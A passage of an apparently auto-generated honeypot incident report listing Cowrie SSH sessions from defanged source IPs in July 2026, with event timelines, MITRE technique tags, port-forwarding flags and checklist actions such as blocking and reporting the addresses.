- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3144ab6de269

| Field | Detail |
|---|---|
| **Source IP** | `34.22.117[.]112` |
| **First Seen** | 2026-07-19 07:18 |
| **Last Seen** | 2026-07-19 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:18:43` | `cowrie.session.connect` |
| `2026-07-19 07:18:43` | `cowrie.login.success` |
| `2026-07-19 07:18:44` | `cowrie.session.params` |
| `2026-07-19 07:18:44` | `cowrie.command.input` |
| `2026-07-19 07:18:44` | `cowrie.command.failed` |
| `2026-07-19 07:18:44` | `cowrie.log.closed` |
| `2026-07-19 07:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.117[.]112` to AbuseIPDB if not already reported
- [ ] Block `34.22.117[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ddbba9debc

| Field | Detail |
|---|---|
| **Source IP** | `34.22.117[.]112` |
| **First Seen** | 2026-07-19 07:18 |
| **Last Seen** | 2026-07-19 07:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:18:45` | `cowrie.session.connect` |
| `2026-07-19 07:18:45` | `cowrie.login.success` |
| `2026-07-19 07:18:46` | `cowrie.session.params` |
| `2026-07-19 07:18:46` | `cowrie.command.input` |
| `2026-07-19 07:18:58` | `cowrie.log.closed` |
| `2026-07-19 07:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.117[.]112` to AbuseIPDB if not already reported
- [ ] Block `34.22.117[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b238f27c3b8c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-19 07:20 |
| **Last Seen** | 2026-07-19 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:20:34` | `cowrie.session.connect` |
| `2026-07-19 07:20:34` | `cowrie.client.version` |
| `2026-07-19 07:20:34` | `cowrie.client.kex` |
| `2026-07-19 07:20:35` | `cowrie.login.success` |
| `2026-07-19 07:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdbeb64b1fbb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-19 07:20 |
| **Last Seen** | 2026-07-19 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:20:34` | `cowrie.session.connect` |
| `2026-07-19 07:20:34` | `cowrie.client.version` |
| `2026-07-19 07:20:34` | `cowrie.client.kex` |
| `2026-07-19 07:20:35` | `cowrie.login.success` |
| `2026-07-19 07:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b62df1a51e4

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-19 07:21 |
| **Last Seen** | 2026-07-19 07:26 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:21:19` | `cowrie.session.connect` |
| `2026-07-19 07:21:20` | `cowrie.client.version` |
| `2026-07-19 07:21:20` | `cowrie.client.kex` |
| `2026-07-19 07:21:22` | `cowrie.login.success` |
| `2026-07-19 07:21:22` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9d8d3ace0f9

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-19 07:21 |
| **Last Seen** | 2026-07-19 07:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:21:32` | `cowrie.session.connect` |
| `2026-07-19 07:21:33` | `cowrie.client.version` |
| `2026-07-19 07:21:33` | `cowrie.client.kex` |
| `2026-07-19 07:21:35` | `cowrie.login.success` |
| `2026-07-19 07:21:36` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6753e8349649

| Field | Detail |
|---|---|
| **Source IP** | `47.236.161[.]139` |
| **First Seen** | 2026-07-19 07:22 |
| **Last Seen** | 2026-07-19 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:22:00` | `cowrie.session.connect` |
| `2026-07-19 07:22:00` | `cowrie.client.version` |
| `2026-07-19 07:22:00` | `cowrie.client.kex` |
| `2026-07-19 07:22:01` | `cowrie.login.success` |
| `2026-07-19 07:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.161[.]139` to AbuseIPDB if not already reported
- [ ] Block `47.236.161[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0928da2481b2

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-19 07:22 |
| **Last Seen** | 2026-07-19 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:22:02` | `cowrie.session.connect` |
| `2026-07-19 07:22:02` | `cowrie.client.version` |
| `2026-07-19 07:22:02` | `cowrie.client.kex` |
| `2026-07-19 07:22:02` | `cowrie.login.success` |
| `2026-07-19 07:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29c4dc5e96ec

| Field | Detail |
|---|---|
| **Source IP** | `103.174.80[.]40` |
| **First Seen** | 2026-07-19 07:24 |
| **Last Seen** | 2026-07-19 07:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:24:23` | `cowrie.session.connect` |
| `2026-07-19 07:24:24` | `cowrie.client.version` |
| `2026-07-19 07:24:24` | `cowrie.client.kex` |
| `2026-07-19 07:24:26` | `cowrie.login.success` |
| `2026-07-19 07:24:26` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `103.174.80[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4db866f74fc

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-07-19 07:24 |
| **Last Seen** | 2026-07-19 07:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:24:31` | `cowrie.session.connect` |
| `2026-07-19 07:24:32` | `cowrie.client.version` |
| `2026-07-19 07:24:32` | `cowrie.client.kex` |
| `2026-07-19 07:24:33` | `cowrie.login.success` |
| `2026-07-19 07:24:33` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8903791639f4

| Field | Detail |
|---|---|
| **Source IP** | `213.126.222[.]66` |
| **First Seen** | 2026-07-19 07:31 |
| **Last Seen** | 2026-07-19 07:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:31:05` | `cowrie.session.connect` |
| `2026-07-19 07:31:05` | `cowrie.client.version` |
| `2026-07-19 07:31:05` | `cowrie.client.kex` |
| `2026-07-19 07:31:06` | `cowrie.login.success` |
| `2026-07-19 07:31:06` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.126.222[.]66` to AbuseIPDB if not already reported
- [ ] Block `213.126.222[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09cbd6f16629

| Field | Detail |
|---|---|
| **Source IP** | `223.82.86[.]2` |
| **First Seen** | 2026-07-19 07:31 |
| **Last Seen** | 2026-07-19 07:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:31:12` | `cowrie.session.connect` |
| `2026-07-19 07:31:13` | `cowrie.client.version` |
| `2026-07-19 07:31:13` | `cowrie.client.kex` |
| `2026-07-19 07:31:15` | `cowrie.login.success` |
| `2026-07-19 07:31:15` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.82.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645e92134ddc

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-19 07:33 |
| **Last Seen** | 2026-07-19 07:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:33:11` | `cowrie.session.connect` |
| `2026-07-19 07:33:13` | `cowrie.client.version` |
| `2026-07-19 07:33:13` | `cowrie.client.kex` |
| `2026-07-19 07:33:19` | `cowrie.login.success` |
| `2026-07-19 07:33:20` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c041fa0b897

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 07:33 |
| **Last Seen** | 2026-07-19 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:33:18` | `cowrie.session.connect` |
| `2026-07-19 07:33:18` | `cowrie.client.version` |
| `2026-07-19 07:33:18` | `cowrie.client.kex` |
| `2026-07-19 07:33:19` | `cowrie.login.success` |
| `2026-07-19 07:33:19` | `cowrie.session.params` |
| `2026-07-19 07:33:19` | `cowrie.command.input` |
| `2026-07-19 07:33:19` | `cowrie.log.closed` |
| `2026-07-19 07:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec15636e99a0

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-07-19 07:36 |
| **Last Seen** | 2026-07-19 07:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:36:30` | `cowrie.session.connect` |
| `2026-07-19 07:36:31` | `cowrie.client.version` |
| `2026-07-19 07:36:31` | `cowrie.client.kex` |
| `2026-07-19 07:36:33` | `cowrie.login.success` |
| `2026-07-19 07:36:33` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7d14b8c157

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-19 07:36 |
| **Last Seen** | 2026-07-19 07:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:36:39` | `cowrie.session.connect` |
| `2026-07-19 07:36:39` | `cowrie.client.version` |
| `2026-07-19 07:36:39` | `cowrie.client.kex` |
| `2026-07-19 07:36:40` | `cowrie.login.success` |
| `2026-07-19 07:36:40` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5edb65b6b0f

| Field | Detail |
|---|---|
| **Source IP** | `103.68.52[.]210` |
| **First Seen** | 2026-07-19 07:44 |
| **Last Seen** | 2026-07-19 07:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:44:36` | `cowrie.session.connect` |
| `2026-07-19 07:44:37` | `cowrie.client.version` |
| `2026-07-19 07:44:37` | `cowrie.client.kex` |
| `2026-07-19 07:44:39` | `cowrie.login.success` |
| `2026-07-19 07:44:40` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.52[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.68.52[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03fecab8ff81

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-07-19 07:47 |
| **Last Seen** | 2026-07-19 07:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:47:51` | `cowrie.session.connect` |
| `2026-07-19 07:47:51` | `cowrie.client.version` |
| `2026-07-19 07:47:51` | `cowrie.client.kex` |
| `2026-07-19 07:47:52` | `cowrie.login.success` |
| `2026-07-19 07:47:53` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb0997c4790

| Field | Detail |
|---|---|
| **Source IP** | `218.59.235[.]170` |
| **First Seen** | 2026-07-19 07:48 |
| **Last Seen** | 2026-07-19 07:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:48:03` | `cowrie.session.connect` |
| `2026-07-19 07:48:04` | `cowrie.client.version` |
| `2026-07-19 07:48:04` | `cowrie.client.kex` |
| `2026-07-19 07:48:07` | `cowrie.login.success` |
| `2026-07-19 07:48:08` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.59.235[.]170` to AbuseIPDB if not already reported
- [ ] Block `218.59.235[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e09b882e45

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-07-19 07:57 |
| **Last Seen** | 2026-07-19 07:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:57:57` | `cowrie.session.connect` |
| `2026-07-19 07:57:58` | `cowrie.client.version` |
| `2026-07-19 07:57:58` | `cowrie.client.kex` |
| `2026-07-19 07:58:00` | `cowrie.login.success` |
| `2026-07-19 07:58:01` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf904070e10

| Field | Detail |
|---|---|
| **Source IP** | `24.207.66[.]154` |
| **First Seen** | 2026-07-19 07:58 |
| **Last Seen** | 2026-07-19 07:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:58:06` | `cowrie.session.connect` |
| `2026-07-19 07:58:07` | `cowrie.client.version` |
| `2026-07-19 07:58:07` | `cowrie.client.kex` |
| `2026-07-19 07:58:08` | `cowrie.login.success` |
| `2026-07-19 07:58:08` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.207.66[.]154` to AbuseIPDB if not already reported
- [ ] Block `24.207.66[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a35ddc3e27

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 08:00 |
| **Last Seen** | 2026-07-19 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:00:40` | `cowrie.session.connect` |
| `2026-07-19 08:00:40` | `cowrie.client.version` |
| `2026-07-19 08:00:40` | `cowrie.client.kex` |
| `2026-07-19 08:00:40` | `cowrie.login.success` |
| `2026-07-19 08:00:40` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:00:40` | `cowrie.direct-tcpip.data` |
| `2026-07-19 08:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6284f64ee9

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-19 08:01 |
| **Last Seen** | 2026-07-19 08:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:01:31` | `cowrie.session.connect` |
| `2026-07-19 08:01:31` | `cowrie.client.version` |
| `2026-07-19 08:01:31` | `cowrie.client.kex` |
| `2026-07-19 08:01:33` | `cowrie.login.success` |
| `2026-07-19 08:01:33` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a833395b0ce

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 08:02 |
| **Last Seen** | 2026-07-19 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:02:58` | `cowrie.session.connect` |
| `2026-07-19 08:02:58` | `cowrie.client.version` |
| `2026-07-19 08:02:58` | `cowrie.client.kex` |
| `2026-07-19 08:02:58` | `cowrie.login.success` |
| `2026-07-19 08:02:59` | `cowrie.session.params` |
| `2026-07-19 08:02:59` | `cowrie.command.input` |
| `2026-07-19 08:02:59` | `cowrie.log.closed` |
| `2026-07-19 08:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d55efa72188d

| Field | Detail |
|---|---|
| **Source IP** | `35.205.66[.]149` |
| **First Seen** | 2026-07-19 08:05 |
| **Last Seen** | 2026-07-19 08:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:05:34` | `cowrie.session.connect` |
| `2026-07-19 08:05:34` | `cowrie.login.success` |
| `2026-07-19 08:05:35` | `cowrie.session.params` |
| `2026-07-19 08:05:35` | `cowrie.command.input` |
| `2026-07-19 08:05:35` | `cowrie.command.input` |
| `2026-07-19 08:05:35` | `cowrie.command.failed` |
| `2026-07-19 08:05:35` | `cowrie.command.input` |
| `2026-07-19 08:05:35` | `cowrie.log.closed` |
| `2026-07-19 08:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.66[.]149` to AbuseIPDB if not already reported
- [ ] Block `35.205.66[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c33c697b5c0

| Field | Detail |
|---|---|
| **Source IP** | `35.205.66[.]149` |
| **First Seen** | 2026-07-19 08:05 |
| **Last Seen** | 2026-07-19 08:06 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:05:48` | `cowrie.session.connect` |
| `2026-07-19 08:05:48` | `cowrie.login.success` |
| `2026-07-19 08:05:48` | `cowrie.session.params` |
| `2026-07-19 08:05:48` | `cowrie.command.input` |
| `2026-07-19 08:05:48` | `cowrie.command.failed` |
| `2026-07-19 08:06:00` | `cowrie.log.closed` |
| `2026-07-19 08:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.66[.]149` to AbuseIPDB if not already reported
- [ ] Block `35.205.66[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6307ef30bb

| Field | Detail |
|---|---|
| **Source IP** | `35.205.66[.]149` |
| **First Seen** | 2026-07-19 08:05 |
| **Last Seen** | 2026-07-19 08:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:05:50` | `cowrie.session.connect` |
| `2026-07-19 08:05:50` | `cowrie.login.success` |
| `2026-07-19 08:05:50` | `cowrie.session.params` |
